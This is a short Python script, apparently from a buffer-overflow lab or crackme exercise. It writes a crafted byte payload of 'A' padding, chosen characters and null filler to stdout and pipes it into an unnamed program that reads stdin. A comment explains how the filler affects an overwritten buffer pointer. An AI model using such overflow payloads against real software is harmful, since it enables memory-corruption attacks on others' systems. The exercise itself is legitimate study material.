import sys

a,b,c = 'i','j','k'
junk = 0x0# if junk is not null the buffer2 ptr will likely point outside of the exe addr space and throw an exception/crash
payload = bytes([0x41]*10 + [ord(c), ord(b)] + [junk]*15 + [ord(a)] + [ord('\n')])

# Write bytes to stdout
sys.stdout.buffer.write(payload)

# python stdout_payload.py | program_reading_stdin.exe
